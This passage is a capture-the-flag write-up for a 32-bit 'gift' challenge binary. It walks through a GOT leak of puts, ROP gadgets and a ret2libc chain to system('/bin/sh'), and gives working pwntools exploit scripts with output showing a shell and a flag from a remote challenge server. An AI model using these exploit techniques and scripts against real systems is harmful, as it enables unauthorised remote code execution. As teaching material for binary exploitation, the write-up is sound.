- GOT stands for Global Offsets Table and is similarly used to resolve addresses.  
  
(https://reverseengineering.stackexchange.com/questions/1992/what-is-plt-got)


```
% readelf -s gift 

Symbol table '.dynsym' contains 14 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)
     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.0 (2)
     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND signal@GLIBC_2.0 (2)
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND alarm@GLIBC_2.0 (2)
     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.0 (2)
     6: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.0 (2)
     8: 00000000     0 FUNC    GLOBAL DEFAULT  UND strtoul@GLIBC_2.0 (2)
     9: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
    10: 00000000     0 OBJECT  GLOBAL DEFAULT  UND stdin@GLIBC_2.0 (2)
    11: 00000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@GLIBC_2.0 (2)
    12: 00000000     0 OBJECT  GLOBAL DEFAULT  UND stdout@GLIBC_2.0 (2)
    13: 08048abc     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
```

maybe i could change "alarm" to call "system" for example.  
i'm a loser a quickly got discouraged by the apparent complexity of it, until i heard about "information leakage".  
  
The libc was kindly provided and we know (at least,, know i do), that wherever the libc is loaded in memory, the offset between 2 given functions will always be the same.  
So if we could remotely leak the address of a libc given function, we could calculate the address of "system"..  
  
  
TL;DR: apparently:  
- PLT contains code to resolve library function addresses
- GOT contains those resolved addresses
  
so if we jump to plt.puts() to make it print *got.puts(),  
we should have the current puts() address in memory and we could deduce system()'s address by adding the correct offset.  
we also need to call "win()" a second time, to enter a second shellcode after we leaked the info and made the calculation.  

Much help from: https://github.com/ctfhacker/ctf-writeups/blob/master/campctf-2015/bitterman-pwn-400/README.md


```
# get plt.puts

% objdump -d gift| grep puts@plt
08048450 <puts@plt>:


# get win()

% objdump -d gift| grep win 
08048703 <win>:


# get got.puts

% readelf -r gift | grep puts
0804d01c  00000507 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0

```

so if we can call 0x08048450(*0x0804d01c), we should leak the address of puts.  
Im still quiet unsure why we need to "pop xyz; ret"; but otherwise it doesnt work  
  
we can find such "gadget":  

```
% ROPgadget --binary gift | egrep "pop ... ; ret"
[...]
0x080483f1 : pop ebx ; ret
[...]

```

so our stack needs to be like this:  
```
+---------------------------+
| 0x08048450     plt.puts() |
+---------------------------+
| 0x080483f1  pop ebx; ret  |
+---------------------------+
| 0804d01c       got.puts   |
+---------------------------+
| 0804d01c       win()      |
+---------------------------+
```

makes some code like this:

```python
% cat exploit_v2.py 
#!/usr/bin/python

from pwn import *
import struct

keycodes = [6419804, 7048451, 1, 5981939, 1809240, 3891630, 1, 2807850, 4265200, 4512418, 1, 5061300, 1303193, 7616025, 1, 6084938]


elf = context.binary = ELF("./gift")
#context.log_level = 'debug'

io = process(elf.path)

offset_eip = 16     # calculated previously

#####

puts_plt = p32(0x08048450)  # address of puts@PLT
pop_ebx  = p32(0x080483f1)  # address of pop ebx; ret;
got_puts = p32(0x0804d01c)  # address of puts@GOT
win      = p32(0x08048703)  # address of win()

# construct shellcode
code  = "A"*offset_eip
code += puts_plt
code += pop_ebx
code += got_puts
code += win 

io = process(elf.path)
io.recvuntil(" > ")
io.sendline("666")

for x in range(16):
    io.recvuntil("Enter keycode %d: "%x)
    io.sendline(str(keycodes[x]))

print io.recv(4096)

io.sendline(code)

addr = struct.unpack("I", io.read(4))[0]
print "address of puts: 0x%x"%addr

print io.recv(4096)
```

```
% ./exploit_v2.py
[*] '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift': pid 11391
[+] Starting local process '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift': pid 11393
[ACCESS GRANTED]
[XMAS SECURITY PROTOCOL ACTIVATED] - Enter new keycode: 
address of puts: 0xf75dd880    <<<------ HERE
f\x84\x0 �Z�aY�
[ACCESS GRANTED]
[XMAS SECURITY PROTOCOL ACTIVATED] - Enter new keycode: 
[*] Stopped process '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift' (pid 11393)
[*] Stopped process '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift' (pid 11391)
```


## Exploiting the win function (Part 2)

Now that we can leak some libc function's address and return to win() to enter more fancy stuff, we can craft something that should do:  
  
system("/bin/sh");  
exit();  
  
luckily everything can be found in the libc:  

```
% gdb-peda ./gift
gdb-peda$ break main
Breakpoint 1 at 0x80489ef
gdb-peda$ run
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f48dc8 ("/bin/sh")

gdb-peda$ info address puts
Symbol "puts" is at 0xf7e4b880 in a file compiled without debugging.

gdb-peda$ info address system
Symbol "system" is at 0xf7e26b40 in a file compiled without debugging.

gdb-peda$ info address exit
Symbol "exit" is at 0xf7e1a7f0 in a file compiled without debugging.

```

so let's calculate the offsets between the address of puts and the others:

```
system  = puts - 0x24d40 (0xf7e4b880 - 0xf7e26b40 == 0x24d40)
exit    = puts - 0x31090 (0xf7e4b880 - 0xf7e1a7f0 == 0x31090)
/bin/sh = puts + 0xfd548 (0xf7e4b880 - 0xf7f48dc8 == -0xfd548)
```


so if we can make our stack look like this:

```
+----------------------------------+
| system() = leaked_puts - 0x24d40 |
+----------------------------------+
| exit()   = leaked_puts - 0x31090 |
+----------------------------------+
| /bin/sh  = leaked_puts + 0xfd548 |
+----------------------------------+
```

we should get a shell...  


we can simply extend of script:  

```python
% cat exploit_v3.py
[...]
## second shellcode

offset_system = -0x24d40
offset_exit   = -0x31090
offset_binsh  = 0xfd548

code = "A"*offset_eip
code += p32(addr + offset_system)
code += p32(addr + offset_exit)
code += p32(addr + offset_binsh)


io.sendline(code)
io.interactive()
```

```
% ./exploit_v3.py
[*] '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift': pid 13167
[+] Starting local process '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift': pid 13169
[ACCESS GRANTED]
[XMAS SECURITY PROTOCOL ACTIVATED] - Enter new keycode: 
address of puts: 0xf75b9880
f\x84\x0 \x9dX�!W�
[ACCESS GRANTED]
[XMAS SECURITY PROTOCOL ACTIVATED] - Enter new keycode: 
[*] Switching to interactive mode
$ id
uid=1000(m) gid=1000(m) groups=1000(m),4(adm)
$ pwd
/home/m/d5
```

## Putting it all together

Since the binary changes with each new connection, the final part was to put everything together.  
Most of the work is already done for the remote shell, but we need to extract the codes.  
  
for this i used distorm3, probably in the most horrible possible way, but it works...  


```python
% cat exploit_v4.py 
#!/usr/bin/python

import distorm3

def get_codes(binary):
    ''' parse binary to extract access codes
    '''
    codes = []
    disasm = {}

    # disassemble everything into memory... yuck
    iterable = distorm3.DecodeGenerator(0x0, binary, distorm3.Decode32Bits)
    for (offset, size, instruction, hexdump) in iterable:
        disasm[offset] = (size, instruction)


    # this is where the check sequence starts
    start = 0x000007bf
    instructions = []


    # get interesting instructions
    for x in range(16):
        size, instr = disasm[start]
        instructions.append(instr)

        # hop 2 instructions
        start += size
        size, instr = disasm[start]
    
        start += size
        size, instr = disasm[start]
        start += size


    # parse interesting instructions
    for instr in instructions:
        # just checking it's != 0
        if instr == 'TEST EAX, EAX':
            codes.append("1")

        # else we get the check value
        elif instr.startswith('CMP EAX, '):
            value = instr.split(" ")[-1]
            codes.append(str(eval(value)))

    return codes


print get_codes(open("./gift", 'rb').read())




% ./exploit_v4.py 
['6419804', '7048451', '1', '5981939', '1809240', '3891630', '1', '2807850', '4265200', '4512418', '1', '5061300', '1303193', '7616025', '1', '6084938']

```


the final exploit is here as [pwnpwn.py]

```
% ./pwnpwn.py
[*] '/home/matth/security/writeups/aotw2018ctf-writeups/day5/libc.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded cached gadgets for './libc.so'
[+] Opening connection to 18.205.93.120 on port 1205: Done
[+] getting binary...: got it
[+] getting access codes...: 6605480 8943792 1 4843465 9645361 4626089 1 2821626 8184439 8814483 1 5357819 7788017 2503320 1 844234
[+] entering the codes...: access granted
[*] building stage1 payload to leak libc address
[*] '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift.bin'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loading gadgets for '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift.bin'
[*] stage 1 rop: read(puts()); call win
0x0000:        0x8048450 puts(134533148)
0x0004:        0x80483f1 <adjust @0xc> pop ebx; ret
0x0008:        0x804d01c got.puts
0x000c:        0x8048703 0x8048703()
[*] sending payload 1
[*] Leaked puts: 0xf7e15360
[*] building stage2 payload to spawn shell
[*] rebased libc address: 0xf7dae000
[*] stage 2 rop: system("/bin/sh")
0x0000:       0xf7dead10 system(4159871183)
0x0004:           'baaa' <return address>
0x0008:       0xf7f298cf arg0
[*] sending payload 2
[*] got shell
[+] flag:  AOTW{s4nt4_l0v3s_BL4CKh4ts}
[*] Closed connection to 18.205.93.120 port 1205
```
